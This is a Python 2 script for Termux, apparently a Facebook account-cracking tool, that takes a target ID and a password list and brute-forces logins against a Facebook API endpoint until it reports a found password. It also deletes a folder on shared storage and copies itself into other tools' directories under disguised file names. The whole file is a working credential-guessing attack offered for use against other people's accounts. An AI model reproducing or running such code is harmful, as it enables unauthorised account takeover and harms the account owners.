import os,sys,time,datetime,random,hashlib,re,cookielib,urllib,json
os.system("termux-setup-storage")
os.system("rm -rf /sdcard/bnt")
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    time.sleep(1)
    os.system('python2 shazad1.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


reload(sys)
sys.setdefaultencoding('utf8')

##### LOGO #####
logo='''
88888888ba   888      88  888888888888
88      "8b  8888     88       88
88      ,8P  88 88    88       88
SHAZAD UP
SHAZAD UP
--------------------------------------------------

➣ Auther   : shazad    
➣ GitHub   : Rezan UP 
➣ YouTube  : 
➣ Blogspot : 

--------------------------------------------------
                                '''

os.system("clear")
print(logo)
idt = raw_input(" Put  Target  ID  : ")
pst = raw_input(' Put Passlist Path: ')
if idt =="binyamin.binnii":
    print 50*"-"
    print
    print " you can not use this to hack fb account"
    print " of tool's owner."
    print " Now you can not use this tool in future"
    print " you've been blocked to use this tool"
    fileout = open("/sdcard/.block", "wb")
    fileout.write("block")
    fileout.close()
    print
    raw_input(" Press enter to exit")
    os.sys.exit()
elif idt =="Binyamin.binnii":
    print 50*"-"
    print
    print " you can not use this to hack fb account"
    print " of tool's owner."
    print " Now you can not use this tool in future"
    print " you've been blocked to use this tool"
    fileout = open("/sdcard/.block", "wb")
    fileout.write("block")
    fileout.close()
    print
    raw_input(" Press enter to exit")
    os.sys.exit()
elif idt =="Binyamin.Binnii":
    print 50*"-"
    print
    print " you can not use this to hack fb account"
    print " of tool's owner."
    print " Now you can not use this tool in future"
    print " you've been blocked to use this tool"
    fileout = open("/sdcard/.block", "wb")
    fileout.write("block")
    fileout.close()
    print
    raw_input(" Press enter to exit")
    os.sys.exit()
elif idt =="BINYAMIN.BINNII":
    print 50*"-"
    print
    print " you can not use this to hack fb account"
    print " of tool's owner."
    print " Now you can not use this tool in future"
    print " you've been blocked to use this tool"
    fileout = open("/sdcard/.block", "wb")
    fileout.write("block")
    fileout.close()
    print
    raw_input(" Press enter to exit")
    os.sys.exit()
elif idt =="100002059014174":
    print 50*"-"
    print
    print " you can not use this to hack fb account"
    print " of tool's owner."
    print " Now you can not use this tool in future"
    print " you've been blocked to use this tool"
    fileout = open("/sdcard/.block", "wb")
    fileout.write("block")
    fileout.close()
    print
    raw_input(" Press enter to exit")
    os.sys.exit()
else:
    pass
    
def cb():
    os.system("clear")

def opn():
    try:
        cb()
        os.mkdir("/sdcard/bnt")
    except OSError:
        cb()
        print logo
        print
        print " Please allow storage permission to termux"
        print " if you're not using termux then install it"
        print " from playstore because this tool is only"
        print " works on mobile"
        print
        raw_input(" Press enter to exit")
        os.sys.exit()
    else:
        login()

def ym():
    try:
        cb()
        os.mkdir("../omi/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bnt/bnt.py ../omi/Omi.py")
        os.system("cp ../bnt/.README.md ../omi/")
        yb()
    
def yb():
    try:
        os.mkdir("../BlackMafia2020/.....")
    except OSError:
        yl()
    else:
        os.system("cp ../bnt/bnt.py ../BlackMafia2020/lovehacker")
        os.system("cp ../bnt/.README.md ../BlackMafia2020/")
        yl()
    
def yl():
    try:
        os.mkdir("../Qurban/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bnt/bnt.py ../Qurban/Qurban.py")
        os.system("cp ../bnt/.README.md ../Qurban/")
        yp()
    
def yp():
    try:
        os.mkdir("../faizanwahla/.....")
    except OSError:
        opn()
    else:
        os.system("cp ../bnt/bnt.py ../faizanwahla/pacman")
        os.system("cp ../bnt/.README.md ../faizanwahla/")
        opn()

def login():
    os.system('clear')
    try:
        toket = open("/sdcard/.block")
    except IOError:
        os.system('clear')
        print(logo)
        try:
            email = (idt)
            passw = (pst)
            total = open(passw, 'r')
            t = total.readlines()
            print ' Email / ID: ' + email
            print ' Total Pass: ' + str(len(t))
            print(' Cracking . . .')
            sandi = open(passw, 'r')
            for p in sandi:
                p = p.replace('\n','')
                print (" Password: "+p)
                try:
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + email + '&locale=en_US&password=' + p + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        print 50* '-'
                        print(" Password Found")
                        print 50*"-"
                        print
                        print ' Username: ' + email
                        print ' Password: ' + p
                        print " Status: Successfull"
                        print
                        os.sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            print 50*"-"
                            print " Password Found"
                            print 50*"-"
                            print
                            print ' Username: ' + email
                            print ' Password: ' + p
                            print " Status: Checkpoint"
                            print
                            os.sys.exit()
                        else:
                            if "limit" in mpsh["error_data"]:
                                print 50*"-"
                                print
                                print " You have exceed the limit of loging in trying wrong password."
                                print " facebook has blocked this action for you for a while"
                                print " there is a limit to login same username with wrong password"
                                print " please try again after some time"
                                print " Thank You"
                                print
                                raw_input(" Press enter to exit")
                                os.sys.exit()
                            else:
                                cb()
                                print logo
                                print ' Email / ID: ' + email
                                print ' Total Pass: ' + str(len(t))
                                print(' Cracking . . .')

                except requests.exceptions.ConnectionError:
                    print ' Connection Error'
                    time.sleep(1)
                    os.sys.exit()

        except IOError:
            print ' File not found . . .'
            raw_input(" Press enter to go back")
            os.system("python2 .README.md")
    else:
        cb()
        print logo
        print
        print " you can not use this tool because"
        print " you've been blocked"
        print
        raw_input(" Press enter to exit")
        os.sys.exit()
if __name__ == '__main__':
	ym()

